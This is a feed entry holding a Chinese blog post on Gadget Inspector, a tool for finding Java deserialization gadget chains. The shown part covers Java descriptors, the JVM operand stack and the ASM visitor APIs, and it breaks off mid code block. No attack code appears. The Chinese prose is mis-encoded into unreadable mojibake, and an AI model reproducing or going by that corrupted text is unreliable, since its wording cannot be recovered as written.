    <title>Gadget Inspector æºç è§£æ</title>
    <link href="https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2021-10-12T03:41:30.000Z</published>
    <updated>2021-11-23T07:11:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Netflix å·¥ç¨‹å¸ˆå¼€å‘çš„ Gadget Inspector æ˜¯ä¸€ä¸ªç”¨äºæŒ–æ˜ Java ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„å·¥å…·ï¼Œç½‘ä¸Šæœ‰ä¸¤ä¸ªåŒåèµ„æ–™ Automated Discovery of Deserialization Gadget Chainsï¼š<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf">è®ºæ–‡</a>ã€<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">PPT</a>ã€‚çœ‹æ‡‚å·¥ä½œæµç¨‹å¹¶ä¸éš¾ï¼Œå…¥å£ç±»éå¸¸æ¸…æ™°æ˜äº†ï¼Œä¸»è¦æ˜¯é€†æ‹“æ‰‘æ’åºã€JVM æ¨¡æ‹Ÿï¼ˆæœ¬åœ°å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆï¼‰çš„éƒ¨åˆ†æ¯”è¾ƒæ™¦æ¶©ã€‚é‰´äºæˆ‘å››èˆäº”å…¥ç®—æ˜¯é›¶åŸºç¡€æ¥è§¦ Javaï¼Œæ‰€ä»¥å‰é¢å…ˆè¡¥å……ä¸€äº›ç›¸å…³çŸ¥è¯†ï¼Œåé¢å†è¯¦ç»†è§£æ Gadget Inspector çš„ä»£ç ã€‚</p><p>åŠ äº†æ³¨é‡Šçš„æºç ï¼š<a href="https://github.com/jckling/gadgetinspector">jckling/gadgetinspector</a></p><h1 id="0x01-é¢„å¤‡çŸ¥è¯†"><a href="#0x01-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="0x01 é¢„å¤‡çŸ¥è¯†"></a>0x01 é¢„å¤‡çŸ¥è¯†</h1><h2 id="1-1-Java-å­—èŠ‚ç "><a href="#1-1-Java-å­—èŠ‚ç " class="headerlink" title="1.1 Java å­—èŠ‚ç "></a>1.1 Java å­—èŠ‚ç </h2><p>çœ‹ç¾å›¢çš„ <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">å­—èŠ‚ç å¢å¼ºæŠ€æœ¯æ¢ç´¢</a> é‡Œé¢çš„ä»‹ç»å°±å¤Ÿäº†ï¼Œå†…å®¹åŒ…æ‹¬ java çš„å­—èŠ‚ç ã€asm æ¡†æ¶ã€Javassist æ¡†æ¶ä»¥åŠ instrument ç±»åº“ã€‚</p><p><strong>é™å®šåï¼ˆqualified namesï¼‰</strong>ï¼šåç§°ã€<code>.</code>ã€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ï¼šdemo.servlet.HelloServletï¼Œæœ‰äº›åœ°æ–¹ç”¨ <code>/</code> ä»£æ›¿ç‚¹å·</p><p><strong>ç®€å•åç§°ï¼ˆsimple nameï¼‰</strong>ï¼šå•ä¸ªæ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ï¼štest</p><p><strong>å®Œå…¨é™å®šåï¼ˆfully qualified namesï¼‰</strong>ï¼šæ¯ä¸ªåŸå§‹ç±»å‹ã€å‘½ååŒ…ã€é¡¶çº§ç±»å’Œé¡¶çº§æ¥å£éƒ½æœ‰ä¸€ä¸ªå®Œå…¨é™å®šåï¼Œæœ‰çš„æ˜¯ç®€å•åç§°æœ‰çš„æ˜¯é™å®šåï¼Œè¯¦è§ <a href="https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.7">6.7. Fully Qualified Names and Canonical Names</a></p><p><strong>æè¿°ç¬¦ï¼ˆDescriptorï¼‰</strong></p><ol><li><p>å­—æ®µï¼ˆFieldï¼‰æè¿°ç¬¦</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FieldDescriptor:</span><br><span class="line">FieldType</span><br><span class="line"></span><br><span class="line">FieldType:</span><br><span class="line">    BaseType</span><br><span class="line">    ObjectType</span><br><span class="line">    ArrayType</span><br><span class="line">   </span><br><span class="line">BaseType:</span><br><span class="line">    B</span><br><span class="line">    C</span><br><span class="line">    D</span><br><span class="line">    F</span><br><span class="line">    I</span><br><span class="line">    J</span><br><span class="line">    S</span><br><span class="line">    Z</span><br><span class="line">   </span><br><span class="line">ObjectType:</span><br><span class="line">    L ClassName ;</span><br><span class="line"></span><br><span class="line">ArrayType:</span><br><span class="line">    [ ComponentType</span><br><span class="line"></span><br><span class="line">ComponentType:</span><br><span class="line">    FieldType</span><br></pre></td></tr></table></figure><p> è¯´æ˜</p><table><thead><tr><th>BaseType Character</th><th>Type</th><th>Interpretation</th></tr></thead><tbody><tr><td>B</td><td>byte</td><td>signed byte</td></tr><tr><td>C</td><td>char</td><td>Unicode character code point in the Basic Multilingual Plane,     encoded with UTF-16</td></tr><tr><td>D</td><td>double</td><td>double-precision floating-point value</td></tr><tr><td>F</td><td>float</td><td>single-precision floating-point value</td></tr><tr><td>I</td><td>int</td><td>integer</td></tr><tr><td>J</td><td>long</td><td>long integer</td></tr><tr><td>L</td><td>ClassName</td><td>;    reference    an instance of class ClassName</td></tr><tr><td>S</td><td>short</td><td>signed short</td></tr><tr><td>Z</td><td>boolean</td><td>true or false</td></tr><tr><td>[</td><td>reference</td><td>one array dimension</td></tr></tbody></table></li><li><p>æ–¹æ³•ï¼ˆMethodï¼‰æè¿°ç¬¦</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MethodDescriptor:</span><br><span class="line">    ( ParameterDescriptor* ) ReturnDescriptor</span><br><span class="line"></span><br><span class="line">ParameterDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line"></span><br><span class="line">ReturnDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line">    VoidDescriptor</span><br><span class="line"></span><br><span class="line">VoidDescriptor:</span><br><span class="line">    V</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-2-JVM"><a href="#1-2-JVM" class="headerlink" title="1.2 JVM"></a>1.2 JVM</h2><p>Gadget Inspector çš„ <code>TaintTrackingMethodVisitor</code> ä¸­æ¨¡æ‹Ÿäº† JVM çš„æœ¬åœ°å˜é‡è¡¨ï¼ˆLocal Variable Tableï¼‰å’Œæ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰ï¼Œç”¨äºè¿›è¡Œæ±¡ç‚¹åˆ†æã€‚</p><p><strong>æ ˆå¸§ï¼ˆStack Frameï¼‰</strong> æ˜¯ç”¨äºæ”¯æŒè™šæ‹Ÿæœºè¿›è¡Œæ–¹æ³•è°ƒç”¨å’Œæ–¹æ³•æ‰§è¡Œçš„æ•°æ®ç»“æ„ï¼Œæ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œéƒ½å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆé‡Œä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><p><strong>æœ¬åœ°å˜é‡è¡¨ï¼ˆLocal Variable Tableï¼‰</strong> å­˜å‚¨äº†æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼Œéšå¼ä¼ å…¥å®ä¾‹å¯¹è±¡æœ¬èº« <code>this</code> ã€‚</p><p><strong>æ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰</strong> ç”±æ“ä½œç æ§åˆ¶å…ƒç´ çš„å‡º/å…¥æ ˆï¼Œæ“ä½œæ•°æ ˆä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»æ„ Java æ•°æ®ç±»å‹ã€‚</p><ul><li>å…¥æ ˆï¼šæœ¬åœ°å˜é‡è¡¨æˆ–å¯¹è±¡å®ä¾‹çš„å­—æ®µä¸­çš„å…ƒç´ ï¼ˆå¸¸é‡/å˜é‡ï¼‰</li><li>å‡ºæ ˆï¼šå°†æ ˆä¸­å…ƒç´ å†™å…¥æœ¬åœ°å˜é‡è¡¨æˆ–è¿”å›ç»™æ–¹æ³•è°ƒç”¨è€…ï¼ˆè¿”å›æ ˆé¡¶ï¼‰</li><li>æ ˆä¸­å…ƒç´ çš„é•¿åº¦å¯èƒ½ä¸º 0ã€1ã€2ï¼Œè¿™é‡Œä¸€ä¸ªå•ä½ä¸º 32 ä½</li></ul><h2 id="1-3-ASM"><a href="#1-3-ASM" class="headerlink" title="1.3 ASM"></a>1.3 ASM</h2><h3 id="è®¿é—®è€…æ¨¡å¼"><a href="#è®¿é—®è€…æ¨¡å¼" class="headerlink" title="è®¿é—®è€…æ¨¡å¼"></a>è®¿é—®è€…æ¨¡å¼</h3><p>è®¿é—®è€…æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯ä¸ºäº†è®¿é—®æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¸å»æ”¹å˜æ•°æ®ç»“æ„ï¼Œè€Œæ˜¯æŠŠå¯¹æ•°æ®çš„æ“ä½œæŠ½è±¡å‡ºæ¥ï¼Œ<strong>åœ¨â€œè®¿é—®â€çš„è¿‡ç¨‹ä¸­ä»¥å›è°ƒå½¢å¼åœ¨è®¿é—®è€…ä¸­å¤„ç†æ“ä½œé€»è¾‘</strong>ã€‚å¦‚æœè¦æ–°å¢ä¸€ç»„æ“ä½œï¼Œé‚£ä¹ˆåªéœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„è®¿é—®è€…ã€‚</p><h3 id="ä»£ç ç»„ç»‡æ¶æ„"><a href="#ä»£ç ç»„ç»‡æ¶æ„" class="headerlink" title="ä»£ç ç»„ç»‡æ¶æ„"></a>ä»£ç ç»„ç»‡æ¶æ„</h3><img src="https://i.loli.net/2021/10/14/KQyh94RWalubxLd.png" width="90%"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.objectweb.asm<span class="comment"># Core APIï¼Œæ ¸å¿ƒåŒ…</span></span><br><span class="line">org.objectweb.asm.commons<span class="comment"># åŸºäº core å’Œ tree çš„ç±»é€‚é…å™¨</span></span><br><span class="line">org.objectweb.asm.signature<span class="comment"># æ³›å‹å®šä¹‰çš„ç›¸å…³æ“ä½œ APIï¼Œæ ¸å¿ƒåŒ…çš„æ‰©å……</span></span><br><span class="line">org.objectweb.asm.tree<span class="comment"># Tree APIï¼Œå®ç°å¤æ‚çš„ç±»è½¬æ¢</span></span><br><span class="line">org.objectweb.asm.tree.analysis        <span class="comment"># åŸºäº tree åŒ…æä¾›çš„é™æ€å­—èŠ‚ç åˆ†ææ¡†æ¶</span></span><br><span class="line">org.objectweb.asm.util<span class="comment"># ç”¨äºè°ƒè¯•çš„ç±»è®¿é—®å™¨å’Œé€‚é…å™¨</span></span><br><span class="line">org.objectweb.asm.xml<span class="comment"># å¼ƒç”¨</span></span><br></pre></td></tr></table></figure><h3 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h3><ol><li><p><code>ClassReader</code> ç±»è§£æ class æ–‡ä»¶ï¼ˆäº‹ä»¶ç”Ÿæˆï¼‰</p><ul><li>è°ƒç”¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™ accept æ–¹æ³•çš„ <code>ClassVisitor</code> å®ä¾‹ä¸Šç›¸åº”çš„ visitXxx æ–¹æ³•</li></ul></li><li><p><code>ClassVisitor</code> ç±»å°†æ‰€æœ‰æ–¹æ³•è°ƒç”¨å§”æ´¾ç»™å¦ä¸€ä¸ª <code>ClassVisitor</code> å®ä¾‹ï¼ˆäº‹ä»¶è¿‡æ»¤ï¼‰</p></li><li><p><code>ClassWriter</code> ç±»æ˜¯ <code>ClassVisitor</code> æŠ½è±¡ç±»çš„å­ç±»ï¼ˆäº‹ä»¶æ¶ˆè´¹ï¼‰</p></li></ol><p>ä¸ºäº†å¯¹ç±»æ–‡ä»¶è¿›è¡Œâ€œè§‚å¯Ÿâ€ï¼Œéœ€è¦ç»§æ‰¿å’Œé‡å†™è®¿é—®è€…ï¼ˆVisitorï¼‰ï¼Œç„¶åè°ƒç”¨ ClassReader.accept æ–¹æ³•æ‰§è¡Œè®¿é—®ï¼Œè¯¥æ–¹æ³•å°†æŒ‰é¡ºåºè°ƒç”¨å‚æ•° ClassVisitor ä¸­çš„æ–¹æ³•ï¼Œæ²¡æœ‰é‡å†™çš„åˆ™è°ƒç”¨çˆ¶ç±» ClassVisitor é»˜è®¤çš„æ–¹æ³•ï¼›è§‚å¯Ÿåˆ°æ–¹æ³•æ—¶ï¼Œå°†æŒ‰é¡ºåºè°ƒç”¨ MethodVisitor ä¸­çš„æ–¹æ³•ï¼Œæ²¡æœ‰é‡å†™çš„ä¹Ÿè°ƒç”¨é»˜è®¤æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> * æ„é€ ä¸€ä¸ªæ–°çš„ ClassReader å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile è¦è¯»å–çš„ JVMS ClassFile ç»“æ„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassReaderâ€‹(<span class="keyword">byte</span>[] classFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨ç»™å®šçš„è®¿é—®è€…è®¿é—®ä¼ é€’ç»™æ­¤ ClassReader çš„æ„é€ å‡½æ•°çš„ JVMS ClassFile ç»“æ„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classVisitor    è®¿é—®è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parsingOptions  ç”¨äºè§£ææ­¤ç±»çš„é€‰é¡¹ï¼ˆSKIP_CODE, SKIP_DEBUG, SKIP_FRAMES, EXPAND_FRAMESï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> acceptâ€‹(ClassVisitor classVisitor, <span class="keyword">int</span> parsingOptions)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/rAEhSn8x3DMLwtO.jpg"><h3 id="è®¿é—®è€…"><a href="#è®¿é—®è€…" class="headerlink" title="è®¿é—®è€…"></a>è®¿é—®è€…</h3><h4 id="1-ClassVisitor"><a href="#1-ClassVisitor" class="headerlink" title="1. ClassVisitor"></a>1. ClassVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visit [ visitSource ] [ visitModule ][ visitNestHost ][ visitOuterClass ] ( visitAnnotation | visitTypeAnnotation | visitAttribute )* ( visitNestMember | [ * visitPermittedSubclass ] | visitInnerClass | visitRecordComponent | visitField | visitMethod )* visitEnd</span><br></pre></td></tr></table></figure><p>Gadget Inspector ä¸­æ¶‰åŠçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>api     è®¿é—®è€…å®ç°çš„ ASM API ç‰ˆæœ¬ã€‚å¿…é¡»æ˜¯ Opcodes.ASM4ã€Opcodes.ASM5ã€Opcodes.ASM6ã€Opcodes.ASM7 ä¹‹ä¸€ã€‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassVisitorâ€‹(<span class="keyword">int</span> api)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è®¿é—®ç±»çš„å¤´éƒ¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>versionç±»ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>accessç±»çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>nameç±»çš„å†…éƒ¨åç§°ï¼ˆå®Œå…¨é™å®šåï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signatureç±»çš„ç­¾å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>superNameçˆ¶ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>interfacesç±»æ¥å£çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, java.lang.String name, java.lang.String signature, java.lang.String superName, java.lang.String[] interfaces)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®ç±»çš„å¤–å›´ç±»ï¼Œå½“ç±»å…·æœ‰å¤–å›´ç±»æ—¶è‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramownerç±»çš„å¤–å›´ç±»çš„å†…éƒ¨åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnameåŒ…å«ç±»çš„æ–¹æ³•çš„åç§°ï¼Œå¦‚æœç±»æ²¡æœ‰åŒ…å«åœ¨å…¶å¤–å›´ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoråŒ…å«ç±»çš„æ–¹æ³•çš„æè¿°ç¬¦ï¼Œå¦‚æœç±»æ²¡æœ‰åŒ…å«åœ¨å…¶å¤–å›´ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®å†…éƒ¨ç±»ï¼Œè¿™ä¸ªå†…éƒ¨ç±»ä¸ä¸€å®šæ˜¯è¢«è®¿é—®çš„ç±»çš„æˆå‘˜</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramownerå†…éƒ¨ç±»çš„å†…éƒ¨åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramouterNameå†…éƒ¨ç±»æ‰€å±çš„ç±»çš„å†…éƒ¨åç§°ï¼Œå¯¹äºéæˆå‘˜ç±»å¯èƒ½ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paraminnerNameå†…éƒ¨ç±»åœ¨å…¶å¤–å›´ç±»ä¸­çš„(ç®€å•)åç§°ï¼Œå¯¹äºåŒ¿åå†…éƒ¨ç±»å¯èƒ½ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccesså†…éƒ¨ç±»æœ€åˆåœ¨å¤–å›´ç±»ä¸­å£°æ˜çš„è®¿é—®æ ‡å¿—</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(java.lang.String name, java.lang.String outerName, java.lang.String innerName, <span class="keyword">int</span> access)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®ç±»çš„å­—æ®µ</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccesså­—æ®µçš„è®¿é—®æ ‡å¿—</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname    å­—æ®µçš„åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptorå­—æ®µçš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramsignatureå­—æ®µçš„ç­¾å</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalue       å­—æ®µçš„åˆå§‹å€¼ï¼Œä»…é’ˆå¯¹é™æ€å­—æ®µ</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor visitFieldâ€‹<span class="params">(<span class="keyword">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.Object value)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è®¿é—®ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼ˆæ–¹æ³•å®šä¹‰ï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è¿™ä¸ªæ–¹æ³•åœ¨æ¯æ¬¡è°ƒç”¨æ—¶å¿…é¡»è¿”å›ä¸€ä¸ªæ–°çš„ MethodVisitor å®ä¾‹ï¼ˆæˆ–nullï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccessæ–¹æ³•çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnameæ–¹æ³•çš„åç§°</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptoræ–¹æ³•çš„æè¿°ç¬¦</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramsignatureæ–¹æ³•çš„ç­¾åï¼Œå¦‚æœæ–¹æ³•å‚æ•°ã€è¿”å›ç±»å‹å’Œå¼‚å¸¸ä¸ä½¿ç”¨æ³›å‹ç±»å‹ï¼Œåˆ™å¯èƒ½ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramexceptionsæ–¹æ³•å¼‚å¸¸ç±»çš„å†…éƒ¨åç§°ï¼Œå¯èƒ½ä¸ºç©º</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.String[] exceptions)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * è¯¥æ–¹æ³•æ˜¯æœ€åä¸€ä¸ªè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œç”¨äºé€šçŸ¥è®¿é—®è€…è¯¥ç±»çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•å·²è¢«è®¿é—®</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h4 id="2-MethodVisitor"><a href="#2-MethodVisitor" class="headerlink" title="2. MethodVisitor"></a>2. MethodVisitor</h4><p>æ–¹æ³•è°ƒç”¨é¡ºåºï¼ˆè®¿é—®é¡ºåºï¼‰ï¼Œ<code>visit&lt;i&gt;X&lt;/i&gt;Insn</code> æŒ‰ç…§å­—èŠ‚ç æŒ‡ä»¤é¡ºåºè°ƒç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( visitParameter )* [ visitAnnotationDefault ] ( visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation visitTypeAnnotation | visitAttribute )* [ visitCode ( visitFrame | visit&lt;i&gt;X&lt;&#x2F;i&gt;Insn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs ] visitEnd</span><br><span class="line"></span><br><span class="line">In addition, the visit&lt;i&gt;X&lt;&#x2F;i&gt;Insn and visitLabel methods must be called in the sequential order of the bytecode instructions of the visited code.</span><br></pre></td></tr></table></figure><p>Gadget Inspector ä¸­æ¶‰åŠçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 